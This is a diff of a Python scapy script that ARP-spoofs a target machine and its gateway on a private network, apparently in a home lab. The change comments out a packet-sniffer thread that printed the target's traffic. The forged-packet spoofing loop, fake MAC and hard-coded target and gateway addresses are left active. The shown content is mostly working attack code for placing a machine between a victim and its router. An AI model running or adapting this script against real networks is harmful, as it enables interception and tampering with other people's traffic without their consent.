@@ -1,6 +1,5 @@
 import os
 import scapy.all as scapy
-import threading
 
 # Check for root privileges
 if not os.geteuid() == 0:
@@ -22,12 +21,12 @@ def spoof(target_ip, spoof_ip, fake_mac):
   scapy.send(packet, verbose=False)
 
 
-def packet_sniffer(target_ip):
-  def process_packet(packet):
-    if packet.haslayer(scapy.IP) and packet[scapy.IP].dst == target_ip:
-      print(f"Packet: {packet.summary()}")
+# def packet_sniffer(target_ip):
+#   def process_packet(packet):
+#     if packet.haslayer(scapy.IP) and packet[scapy.IP].dst == target_ip:
+#       print(f"Packet: {packet.summary()}")
 
-  scapy.sniff(prn=process_packet, store=False)
+#   scapy.sniff(prn=process_packet, store=False)
 
 
 fake_mac = "de:ad:be:ef:de:ad"  # Fake MAC address
@@ -35,9 +34,9 @@ target_ip = "192.168.122.178"  # IP of the target machine
 gateway_ip = "192.168.122.1"  # IP of the router
 
 # Start packet sniffer in a separate thread
-sniffer_thread = threading.Thread(
-    target=packet_sniffer, args=(target_ip,), daemon=True)
-sniffer_thread.start()
+# sniffer_thread = threading.Thread(
+#     target=packet_sniffer, args=(target_ip,), daemon=True)
+# sniffer_thread.start()
 
 try:
   while True:
